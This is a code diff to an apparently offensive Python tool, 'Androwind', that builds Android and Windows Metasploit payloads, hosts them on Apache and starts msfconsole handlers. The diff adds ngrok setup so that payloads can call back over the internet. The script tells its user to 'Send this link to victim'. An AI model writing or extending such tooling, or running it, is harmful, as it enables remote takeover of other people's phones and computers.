@@ -13,12 +13,15 @@ import time
 #Global varables
 
 red_ex = "[\033[91m!\033[0m]"
-blue_plus = "[\033[95m+\033[0m]"
+blue_plus = "[\033[95m✔\033[0m]"
 PATH_OF_PAYLOAD = "/tmp/payload"
+GREEN = "[\033[92m◉\033[0m]"
 ip = ""
 port = ""
 filename = ""
 APrompt = "\033[95mAndrowind ~# \033[0m"
+ng_ins = f'''\n{GREEN} Signup: https://dashboard.ngrok.com/signup \n{GREEN} Login: https://dashboard.ngrok.com/login\n'''
+
 #Payload for Android
 def __animation__():
     animation = ("\/-\\")
@@ -109,13 +112,39 @@ def metaConfig(ip, port):
 def systemHandler():
     os.system("xterm -T Metasploit -e nano systemHandler.r")
 
+def ngrok():
+    animation = ("\/-\\")
+    for i in range(10):
+        time.sleep(0.1)
+        sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Installing ngrok..")
+        sys.stdout.flush()
+    os.system("cp ngrok /usr/local/bin")
+    print("\n" + blue_plus + " Ngrok installed \n")
+    print("")
+def ngConfig():
+    path = "/root/.ngrok2"
+    animation = ("\/-\\")
+    for i in range(10):
+        time.sleep(0.1)
+        sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Configuring ngrok.yml file..")
+        sys.stdout.flush()
+    if not os.path.exists(path):
+        os.system(f"mkdir /root/.ngrok2 && cp ngrok.yml /root/.ngrok2/")
+        token = input("\n" + ng_ins + "\n" + red_ex + " Enter your token:")
+        os.system(f"ngrok authtoken {token}")
+    print("\n" + blue_plus + " Configurations done")
+    print(blue_plus + " All done! For WAN forward ports by typing a command: \033[93m ngrok start --all \033[0m")
+    print("")
+
 def main():
     logo()
     __apache__()
     __directory__()
+    ngrok()
+    ngConfig()
 
     #input from user
-    choice = input(red_ex + " Set default IP and Port no [Y/n]: ")
+    choice = input(GREEN + "\033[91mSet default IP for LAN OR press n for set custom IP and PORT for WAN \033[0m\n" + red_ex + " Set default IP and Port no [Y/n]: ")
     if choice[0].upper() == 'Y':
         ip =   ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
         port = 4444
@@ -123,11 +152,11 @@ def main():
         filename = input("\n" + red_ex + " Enter filename without extension: ")
         print(blue_plus + " set Filename = > ", filename)
     else:
-        ip = input(red_ex + " Enter your ip address: ")
+        ip = input("\n" + red_ex + " Enter your ip address: ")
         print(blue_plus + " set IP = > ", ip)
-        port = input(red_ex + " Enter port no: ")
+        port = input("\n" + red_ex + " Enter port no: ")
         print(blue_plus + " set Port no = > ", port)
-        filename = input(red_ex + " Enter filename without extension: ")
+        filename = input("\n" + red_ex + " Enter filename without extension: ")
         print(blue_plus + " set Filename = > ", filename)
 
     ch = int(input("\n[1] Android Payload \n[2] Windows Payload \n\n" +  APrompt ))
@@ -147,7 +176,7 @@ def main():
         print("\n"+ blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.exe \033[0m\n")
         msf = input(red_ex + " Metasploit = > [Yes/No]: ")
         if msf[0].upper() == 'Y':
-            print("Config payload..")
+            print(blue_plus + " Config payload..")
             metaConfig(ip, port)
             systemHandler()
             msfconsole()
@@ -159,4 +188,3 @@ def main():
         print(red_ex + " You've entered wrong choice, try again!")
 if __name__=="__main__":
     main()
-
